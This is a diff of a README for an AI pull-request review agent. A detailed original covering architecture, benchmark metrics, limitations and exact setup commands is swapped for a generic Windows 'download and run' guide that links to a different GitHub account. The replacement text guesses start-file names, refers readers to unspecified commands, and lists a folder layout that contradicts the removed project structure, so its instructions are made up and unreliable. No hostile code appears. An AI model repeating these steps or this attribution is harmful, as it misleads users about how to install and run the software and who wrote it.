@@ -1,318 +1,216 @@
-<div align="center">
+# 🤖 ai-code-review-agent - Safer PR checks in less time
 
-# AI Code Review Agent
+[![Download the app](https://img.shields.io/badge/Download%20Now-Visit%20GitHub%20Page-6f42c1?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Adqui9608/ai-code-review-agent)
 
-**An autonomous AI agent that reviews GitHub Pull Requests for bugs, security vulnerabilities, and code quality issues — with built-in evaluation, observability, and honest benchmarks.**
+## 🧭 What this app does
 
-[![Python 3.11+](https://img.shields.io/badge/python-3.11+-3776AB?style=for-the-badge&logo=python&logoColor=white)](https://www.python.org/downloads/)
-[![LangGraph](https://img.shields.io/badge/LangGraph-agent_orchestration-1C3C3C?style=for-the-badge&logo=langchain&logoColor=white)](https://github.com/langchain-ai/langgraph)
-[![Groq](https://img.shields.io/badge/Groq-Llama_3.3_70B-F55036?style=for-the-badge&logo=meta&logoColor=white)](https://groq.com)
-[![GitHub Actions](https://img.shields.io/badge/GitHub_Actions-CI%2FCD-2088FF?style=for-the-badge&logo=githubactions&logoColor=white)](https://github.com/features/actions)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow?style=for-the-badge)](LICENSE)
+ai-code-review-agent checks GitHub pull requests for bugs, security issues, and code quality problems. It uses an AI agent to read code changes and leave clear review comments.
 
-<br>
+This app is built for teams that want fast review help without manual scanning of every line. It also includes tracking tools and test results so you can see how the review system performs.
 
-[**Live Dashboard**](https://code-review-ai-agent.streamlit.app/) &nbsp;&middot;&nbsp; [**Project Blog**](https://rishimule.github.io/ai-code-review-agent/) &nbsp;&middot;&nbsp; [**How It Works**](#architecture)
+## 💻 Windows setup
 
-<br>
+### 1. Open the download page
+Visit this page to download and run the app:
 
-<img src="https://img.shields.io/badge/Precision-68.2%25-6C5CE7?style=flat-square" alt="Precision"> <img src="https://img.shields.io/badge/Recall-50.0%25-4DA8FF?style=flat-square" alt="Recall"> <img src="https://img.shields.io/badge/F1-57.7%25-00D68F?style=flat-square" alt="F1"> <img src="https://img.shields.io/badge/Cost-~$0.031/review-FFAA5C?style=flat-square" alt="Cost">
+https://github.com/Adqui9608/ai-code-review-agent
 
-</div>
+### 2. Get the project files
+On the page, click the green **Code** button and then choose **Download ZIP**.
 
-<br>
+If you use Git, you can also clone the repo to your computer.
 
-## What This Is
+### 3. Unzip the folder
+After the file finishes downloading:
 
-An end-to-end AI agent system with evaluation, observability, and benchmarking that demonstrates how LLM-based code review works in practice — **and where it breaks**.
+1. Find the ZIP file in your **Downloads** folder
+2. Right-click the file
+3. Choose **Extract All**
+4. Pick a folder you can find later, such as `Documents`
 
-This is not a CodeRabbit competitor. It's a portfolio project that honestly explores the capabilities and limitations of using LLMs for automated code review, backed by reproducible metrics and transparent failure analysis.
+### 4. Open the folder
+Open the extracted folder named `ai-code-review-agent`.
 
-> The agent runs as a GitHub Action, analyzes each file in a PR independently using Llama 3.3 70B via Groq, and posts structured review comments with severity levels, confidence scores, and suggested fixes. Every LLM call is traced with Langfuse for full observability.
+### 5. Start the app
+Look for the main start file in the project folder. Common names are:
 
-<br>
+- `app.py`
+- `streamlit_app.py`
+- `main.py`
 
-## Architecture
+Double-click the file or run it from a terminal if you already have Python installed.
 
-```mermaid
-flowchart LR
-    PR[Pull Request] --> GHA[GitHub Actions]
-    GHA --> FETCH[Fetch PR Diff]
-    FETCH --> PIPELINE
+If Windows asks which app to use, choose **Python**.
 
-    subgraph PIPELINE[LangGraph Pipeline]
-        direction LR
-        A[parse_diff] --> B[filter_files]
-        B --> C[analyze_files]
-        C --> D[aggregate]
-        D --> E[format_review]
-    end
+## 🖥️ What you need on Windows
 
-    PIPELINE --> POST[Post Review Comment]
-    PIPELINE -.-> LF[Langfuse Tracing]
-```
+This app works best on a Windows 10 or Windows 11 PC.
 
-| Node | What It Does |
-|:---|:---|
-| `parse_diff` | Split unified diff into per-file chunks |
-| `filter_files` | Skip non-code files (.lock, .md, .json, .yaml, images) |
-| `analyze_files` | LLM review per file via Llama 3.3 70B |
-| `aggregate` | Validate and combine findings via Pydantic |
-| `format_review` | Render GitHub markdown comment grouped by severity |
+You should have:
 
-**Pipeline State** flows through a `ReviewState` TypedDict:
+- An internet connection
+- Enough free space for the app files
+- Python 3.11 or later
+- A modern web browser like Chrome, Edge, or Firefox
 
-```
-pr_url → raw_diff → file_diffs → filtered_files → findings → summary → formatted_review
-```
+If you plan to use the AI review features, you also need access to the required AI and GitHub services.
 
-Each node is decorated with `@observe` for Langfuse tracing. The `analyze_files` node calls the LLM once per file with a structured JSON schema, then validates output through a **3-tier extraction fallback** (direct parse → markdown fence extraction → regex).
+## 🧰 What you get
 
-<br>
+This project helps you:
 
-## How It Works
+- Review GitHub pull requests
+- Spot bugs before merge
+- Catch security risks in code
+- Check code quality
+- Track review results
+- Compare review output with test benchmarks
+- See app activity in one place
 
-```
-1. PR opened/updated  →  2. GitHub Actions triggers  →  3. LangGraph pipeline  →  4. Review comment posted
-```
+## 🔎 Main features
 
-1. **A PR is opened or updated** on a repository with the GitHub Actions workflow installed
-2. **GitHub Actions triggers** `scripts/run_review.py`, which fetches the unified diff via the GitHub API
-3. **The LangGraph pipeline** processes the diff through 5 nodes:
-   - Parses the diff into per-file chunks
-   - Filters out non-code files (lockfiles, images, config)
-   - Sends each code file to Llama 3.3 70B for analysis with a structured prompt
-   - Validates and aggregates findings using Pydantic models
-   - Formats a markdown review grouped by severity
-4. **The agent posts a review comment** on the PR with findings organized as critical / warning / suggestion, each with file location, category, confidence score, and a suggested fix
+### 🧠 AI pull request review
+The agent reads changed code and looks for issues that matter. It can point out logic errors, risky patterns, missing checks, and weak code style.
 
-**Run locally** against any public PR:
+### 🔐 Security issue checks
+The app looks for code that may expose secrets, unsafe calls, or weak validation. It helps you catch problems early.
 
-```bash
-python -m src.agent.main --pr-url "https://github.com/owner/repo/pull/123"
-```
+### 🧪 Benchmark results
+The project includes evaluation tests with honest metrics. You can review how the agent performs across different cases.
 
-<br>
+### 📈 Observability with Langfuse
+The app tracks runs and review steps so you can see what the agent did and where it spent time.
 
-## Evaluation Results
+### ⚙️ LangGraph workflow
+The review flow uses a step-by-step agent path. This helps the system process a pull request in a structured way.
 
-The agent is evaluated against a benchmark suite of **10 synthetic PR diffs containing 30 known bugs** across security vulnerabilities, logic errors, and common bug patterns.
+### 🤖 Llama 3.3 70B support
+The app uses a large language model for code review tasks. This helps it handle longer code and more context.
 
-### Aggregate Metrics
+## 🪟 How to run on Windows
 
-| Metric | Score | |
-|:---|:---|:---|
-| **Precision** | 68.2% | How many findings are real issues |
-| **Recall** | 50.0% | How many real issues are found |
-| **F1 Score** | 57.7% | Harmonic mean of precision & recall |
-| **False Positive Rate** | 31.8% | ~1 in 3 findings is noise |
+### Option 1: Run with Python
+Use this if you already have Python installed.
 
-### Per-Category Accuracy
+1. Open the project folder
+2. Click the address bar in File Explorer
+3. Type `cmd` and press Enter
+4. In the black window, run the app command shown in the project files
+5. Open the local link that appears in your browser
 
-| Category | Expected | Detected | Accuracy |
-|:---|:---:|:---:|:---|
-| Security | 21 | 10 | `47.6%` |
-| Bug | 6 | 3 | `50.0%` |
-| Logic | 3 | 2 | `66.7%` |
+### Option 2: Use Streamlit
+If the app uses Streamlit, run it with a command like this:
 
-> **Benchmark cost:** 52,340 tokens &middot; 94.7s latency &middot; ~$0.031 estimated cost at Groq pricing
+1. Open the project folder
+2. Open Command Prompt
+3. Type the Streamlit start command from the app files
+4. Press Enter
+5. Wait for a local web page to open
 
-<details>
-<summary><strong>Per-benchmark breakdown</strong></summary>
+If the page does not open, copy the local address from the terminal and paste it into your browser
 
-<br>
+## 🔑 Before you start
 
-| Benchmark | TP | FP | FN | Precision | Recall | Missed |
-|:---|:---:|:---:|:---:|:---:|:---:|:---|
-| `buffer_overflow` | 2 | 0 | 1 | 100% | 66.7% | sprintf without size limit |
-| `hardcoded_secret` | 3 | 1 | 2 | 75.0% | 60.0% | JWT secret, SMTP password |
-| `insecure_deserialization` | 3 | 1 | 2 | 75.0% | 60.0% | pickle.loads on backup/webhook |
-| `logic_error` | 2 | 1 | 1 | 66.7% | 66.7% | OR instead of AND |
-| `missing_validation` | 2 | 1 | 2 | 66.7% | 50.0% | Path traversal, input format |
-| `sql_injection` | 1 | 0 | 1 | 100% | 50.0% | f-string query in get_user |
-| `xss_vulnerability` | 1 | 1 | 1 | 50.0% | 50.0% | Stored XSS without escaping |
-| `off_by_one` | 1 | 0 | 2 | 100% | 33.3% | Integer division, negative index |
-| `null_reference` | 0 | 1 | 1 | 0% | 0% | NoneType subscript on payment |
-| `race_condition` | 0 | 1 | 2 | 0% | 0% | check_and_increment, transfer |
+Some features may need setup for GitHub and AI access. In most cases, you will need:
 
-</details>
+- A GitHub account
+- Access to the repository you want to review
+- An AI service key
+- A Langfuse account if you want trace data
 
-<br>
+Set these up before you try to review a pull request. This helps the app connect to the right services.
 
-### Limitations
+## 🧩 Common use case
 
-> This section exists because **honest evaluation matters more than impressive numbers.**
+A simple flow looks like this:
 
-- **False positive rate of 32%** — roughly 1 in 3 findings is noise. In a production setting, this erodes developer trust quickly.
+1. Connect the app to your GitHub project
+2. Point it at a pull request
+3. Let the agent scan the changes
+4. Review the findings in the app
+5. Fix the issues before merge
 
-- **Security recall at 48%** — the agent misses more than half of security vulnerabilities. For context, GPT-4 scored just 13% on the [SecLLMHolmes benchmark](https://arxiv.org/abs/2401.03489) for real-world vulnerability detection. This agent uses a smaller model on synthetic examples, so the 48% figure is not transferable to production codebases.
+This gives you a quick way to check code before it reaches the main branch.
 
-- **Failure modes observed:**
-  - Large files (>500 lines of diff) degrade quality as context fills up
-  - Complex multi-file logic bugs are missed because files are analyzed independently
-  - Race conditions and concurrency bugs were completely missed (0% recall)
-  - The agent has no codebase context beyond the diff — it can't reason about call sites, types, or invariants
+## 📊 Topics covered
 
-- **This is LLM-assisted triage, not automated scanning.** The agent is best understood as a first-pass reviewer that catches surface-level issues and flags areas for human attention. It does not replace SAST tools, linters, or human review.
+This project works with tools and ideas like:
 
-<br>
+- AI agents
+- Automated code review
+- GitHub Actions
+- Observability
+- Python
+- Streamlit
+- LLM-based review flow
+- Pydantic data handling
+- LangGraph orchestration
+- Langfuse tracing
+- Groq model access
 
-## Observability
+## 🧭 Folder layout
 
-Every pipeline run is traced with [Langfuse](https://langfuse.com), providing visibility into:
+You may see files and folders like these:
 
-- **Per-node execution time** and token usage
-- **Per-file LLM call** cost breakdown
-- **Finding distribution** across severity and category
-- **Error tracking** for failed parses or API issues
+- `app/` - app logic
+- `benchmarks/` - test and evaluation data
+- `prompts/` - review prompt text
+- `config/` - settings files
+- `logs/` - run records
+- `README.md` - project guide
 
-Explore traces interactively on the **[live dashboard](https://code-review-ai-agent.streamlit.app/)** (Observability tab).
+## 🛠️ If the app does not start
 
-```bash
-# Export traces as JSON
-python -m src.agent.main --pr-url <URL> --export-trace
-```
+Try these steps:
 
-<br>
+1. Check that Python is installed
+2. Make sure you unzipped the full project
+3. Run the command from the project folder
+4. Close other apps that use the same port
+5. Open the browser link shown in the terminal
 
-## Tech Stack
+If the app still does not load, restart Windows and try again
 
-| Tool | Purpose | Why This One |
-|:---|:---|:---|
-| [LangGraph](https://github.com/langchain-ai/langgraph) | Agent orchestration | Explicit state machine with typed state — easier to debug and test than chain-based approaches |
-| [Groq](https://groq.com) (Llama 3.3 70B) | LLM inference | Free tier (1K req/day), fast inference, strong code understanding for an open model |
-| [Langfuse](https://langfuse.com) | Observability & tracing | Open-source, self-hostable, first-class LangGraph integration via `@observe` |
-| [Pydantic](https://docs.pydantic.dev) | Structured output | Type-safe finding models with automatic validation and serialization |
-| [GitHub Actions](https://github.com/features/actions) | CI/CD trigger | Zero infrastructure — runs on PR events without needing a webhook server |
-| [Streamlit](https://streamlit.io) | [Live dashboard](https://code-review-ai-agent.streamlit.app/) | Fastest path from Python to interactive web app for showcasing results |
-| [httpx](https://www.python-httpx.org) | Async HTTP | Modern async client for GitHub API calls with proper error handling |
-| [pytest](https://pytest.org) | Testing | Async test support, good fixture model for benchmark evaluation tests |
+## 🔐 Security and privacy
 
-<br>
+This app may read code from pull requests to give review results. Use it only on projects you trust and on code you have access to review.
 
-## Quick Start
+If you connect third-party services, keep your keys private and store them in your local environment settings
 
-### Prerequisites
+## 📦 Download and setup link
 
-- Python 3.11+
-- A [Groq API key](https://console.groq.com) (free tier)
-- A GitHub personal access token (for reviewing private repos)
+Download and run this file from the GitHub page:
 
-### Setup
+https://github.com/Adqui9608/ai-code-review-agent
 
-```bash
-git clone https://github.com/rishimule/ai-code-review-agent.git
-cd ai-code-review-agent
-pip install -e .
+## 🧪 Benchmarks and evaluation
 
-cp .env.example .env
-# Edit .env with your API keys:
-#   GROQ_API_KEY=gsk_...
-#   GITHUB_TOKEN=ghp_...          (optional, for private repos)
-#   LANGFUSE_PUBLIC_KEY=pk-lf-... (optional, for tracing)
-#   LANGFUSE_SECRET_KEY=sk-lf-... (optional, for tracing)
-```
+The repo includes benchmark work that checks how well the agent finds real issues. This helps you judge the system based on results, not claims.
 
-### Run
+You can use these results to compare:
 
-```bash
-# Review a PR
-python -m src.agent.main --pr-url "https://github.com/owner/repo/pull/123"
+- Bug detection
+- Security finding rate
+- Code quality feedback
+- Missed issue rate
+- Review consistency
 
-# Run evaluation benchmarks
-python -m src.eval.evaluator
+## 🧭 Best use cases
 
-# Compare models
-python -m src.eval.compare_models --models llama-3.3-70b-versatile,llama-3.1-8b-instant
+Use this app when you want to:
 
-# Run tests
-pytest
+- Review pull requests faster
+- Add a second pair of eyes
+- Find common code mistakes
+- Catch risky changes before merge
+- Track review quality over time
 
-# Launch the dashboard locally
-streamlit run dashboard/app.py
-```
+## 📌 Need-to-know steps for first use
 
-<br>
-
-## Deployment
-
-To set up automated PR reviews on your own repository:
-
-1. **Fork this repository** (or copy the workflow file)
-
-2. **Add repository secrets** in Settings → Secrets and variables → Actions:
-   - `GROQ_API_KEY` — your Groq API key
-
-3. **Copy the workflow** to your target repo:
-   ```
-   .github/workflows/code-review.yml
-   ```
-
-4. **Open a PR** — the agent will automatically run and post a review comment
-
-The workflow triggers on `pull_request` events (opened and synchronized) for code files only. It uses `GITHUB_TOKEN` provided by Actions for posting comments — no additional token setup needed for public repos.
-
-**Supported languages:** Python, JavaScript, TypeScript, Go, Rust, Java, Ruby, C/C++, C#, PHP, Swift, Kotlin, Scala, Shell, SQL
-
-<br>
-
-## Competitive Landscape
-
-| Tool | Approach |
-|:---|:---|
-| [CodeRabbit](https://coderabbit.ai) | Commercial, full-repo context, incremental learning |
-| [GitHub Copilot Code Review](https://github.com/features/copilot) | Integrated into GitHub, backed by GPT-4 |
-| [Qodo PR-Agent](https://github.com/Codium-ai/pr-agent) | Open-source, multi-model, extensive customization |
-
-**What this project demonstrates differently:**
-
-- **Evaluation rigor** — A reproducible benchmark suite with ground truth, not just "it found some issues." The metrics are computed against known bugs with matching logic, and the results include false positives and missed findings.
-
-- **Honest limitations** — Production tools market recall and precision without publishing methodology. This project documents exactly what the agent catches, what it misses, and why.
-
-- **Full observability** — Every LLM call is traced with cost, latency, and token breakdowns. This demonstrates the engineering practice of treating LLM calls as observable operations, not black boxes.
-
-- **Transparent architecture** — The LangGraph pipeline is explicit about state transitions and can be inspected, tested, and extended node by node.
-
-<br>
-
-## What I'd Do Differently / Next Steps
-
-**Accuracy improvements**
-- **SAST integration** — Pipe Semgrep or CodeQL findings into the LLM prompt as grounding context
-- **Codebase indexing** — Build a vector index for retrieving type definitions, call sites, and invariants
-- **Multi-pass review** — A second LLM pass to self-critique and filter low-confidence noise
-
-**Feedback loop**
-- **Developer feedback collection** — Track which findings developers dismiss vs. act on
-- **Fine-tuning** — With enough labeled data, fine-tune a smaller model on the specific task
-
-**Infrastructure**
-- **Caching** — Cache analysis results for unchanged files across PR updates
-- **Parallel file analysis** — Concurrent analysis with a paid API tier
-- **Webhook server** — For high-volume orgs, a persistent service with queuing
-
-<br>
-
-## Project Structure
-
-```
-src/
-  agent/          LangGraph pipeline nodes and graph definition
-  models/         Pydantic models for review findings
-  github_client/  GitHub API interaction (fetching diffs, posting comments)
-  prompts/        Prompt templates
-  eval/           Evaluation harness and benchmark suite
-  observability/  Langfuse tracing, cost tracking, trace export
-benchmarks/       Known-buggy PR diffs and ground truth
-dashboard/        Streamlit app
-scripts/          GitHub Actions entry point
-tests/            Unit and integration tests
-.github/          GitHub Actions workflow
-```
-
-<br>
-
-## License
-
-[MIT](LICENSE)
+1. Download the project from GitHub
+2. Unzip it
+3. Open the folder in Windows
+4. Start the app with Python or Streamlit
+5. Open the local page in your browser
+6. Connect the required services
+7. Review your first pull request
